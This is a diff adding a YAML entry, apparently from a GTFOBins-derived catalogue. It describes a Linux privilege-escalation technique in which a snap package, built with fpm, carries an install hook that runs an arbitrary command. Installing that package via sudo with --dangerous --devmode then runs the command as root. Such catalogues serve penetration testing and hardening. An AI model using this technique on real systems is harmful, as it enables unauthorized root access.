@@ -1,0 +1,39 @@
+id: gtfobins/snap/command/sudo
+type: binary
+platform: linux
+name: snap
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- command-execution
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: snap install xxxx_1.0_all.snap --dangerous --devmode
+  comment: 'Generate the Snap package with [fpm](https://github.com/jordansissel/fpm) and upload it to
+    the target.
+
+
+    ```
+
+    mkdir -p meta/hooks
+
+    echo -e ''#!/bin/sh\n/path/to/command; false'' >meta/hooks/install
+
+    chmod +x meta/hooks/install
+
+    fpm -n xxxx -s dir -t snap -a all meta
+
+    ```'
+references:
+- https://gtfobins.github.io/gtfobins/snap/
+tags:
+- linux
+- unix
+- gtfobins
